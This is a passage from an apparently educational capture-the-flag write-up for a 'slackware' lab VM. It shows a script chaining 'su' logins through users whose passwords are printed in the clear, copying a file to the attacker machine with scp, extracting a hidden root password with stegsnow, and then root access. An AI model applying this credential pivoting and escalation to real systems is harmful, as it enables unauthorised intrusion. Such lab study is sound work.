3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : h1dr0
NEXT TARGET  : catch_me75
PASSWORD     : Vkyo6rKvXsIw
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : catch_me75
NEXT TARGET  : josemlwdf
PASSWORD     : jLzXNEEFdtLX
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : josemlwdf
NEXT TARGET  : skinny
PASSWORD     : iJ7EnTBCtUS8
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
!!! Chain ended or reached the final user: skinny
------------------------------------------------
total 9
drwxr-x---  2 skinny josemlwdf  112 Mar 10  2024 .
drwxr-xr-x 54 root   root      1400 Mar 10  2024 ..
-rw-r--r--  1 skinny skinny    3729 Feb  2  2022 .screenrc
-rw-r-----  1 skinny josemlwdf   13 Mar 10  2024 mypass.txt
```

**Privilege Escalation**

Although the automated chain ended at the user skinny, further investigation revealed that the user flag was actually located within the home directory of the user rpj7.

```bash
h1dr0@slackware:~$ su - rpj7
Password:
rpj7@slackware:~$ ls -la
total 17
drwxr-x---  2 rpj7 b4el7d  168 May 10 04:17 ./
drwxr-xr-x 54 root root   1400 Mar 10  2024 ../
-rw-------  1 rpj7 rpj7     29 May 10 04:17 .bash_history
-rw-r--r--  1 rpj7 rpj7   3729 Feb  2  2022 .screenrc
-rw-r-----  1 rpj7 b4el7d   13 Mar 10  2024 mypass.txt
-rw-r--r--  1 rpj7 b4el7d  314 Mar 11  2024 user.txt
```

The user.txt file appeared to contain the initial flag, but further inspection with `cat -A` revealed hidden whitespace characters, suggesting steganographic encoding.

```bash
rpj7@slackware:~$ cat user.txt
HMV{Th1[REDACTED]}

rpj7@slackware:~$ cat -A user.txt
HMV{Th1[REDACTED]}^I     ^I      ^I ^I   ^I     ^I       ^I       $
    ^I      ^I^I    ^I       ^I^I^I ^I   ^I       $
       ^I ^I     ^I       ^I      ^I    ^I      ^I     ^I    $
^I     ^I    ^I ^I    ^I     ^I      ^I       ^I   ^I  $
     ^I   ^I   ^I     ^I     ^I   ^I ^I^I      ^I $
     ^I       ^I       ^I    ^I      ^I    ^I     ^I  ^I $
^I       ^I     ^I $
```

The file was transferred to the local attacker machine for analysis using stegsnow.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ scp -P 1 rpj7@192.168.100.185:~/user.txt .
(rpj7@192.168.100.185) Password:
user.txt                100%  314    66.4KB/s   00:00

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ stegsnow -C user.txt
To_Jest_Bardzo_Trudne_Haslo 
```

The extracted string served as the root password. Authenticating as root allowed for final system enumeration. A global search for the root flag revealed its location within the .screenrc configuration file of the user 0xh3rshel.

```bash
rpj7@slackware:~$ su - root
Password:
root@slackware:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),17(audio)
root
slackware.slackware.local
root@slackware:~# cat /root/roo00oot.txt
There is no root flag here, but it is somewhere in the /home directory.
root@slackware:~# grep -rn /home/ -e "HMV{"
/home/rpj7/user.txt:1:HMV{Th1[REDACTED]}                    
/home/0xh3rshel/.screenrc:19:# Here is a flag for root: HMV{Sla[REDACTED]}
```

---

## Attack Chain Summary
1. **Reconnaissance**: Custom network scanning identified the target and revealed nonstandard port assignments for SSH and HTTP services.
2. **Vulnerability Discovery**: Web fuzzing located a split 7zip archive, and image analysis combined with visual identification provided initial credentials.
3. **Exploitation**: SSH access was established as the user patrick, serving as the entry point for internal enumeration.
4. **Internal Enumeration**: A complex web of group based read permissions was discovered, which was bypassed using a custom automation script to pivot through dozens of users.
5. **Privilege Escalation**: Steganographic analysis of the user flag file provided the root password, leading to system compromise and the recovery of the final flag.

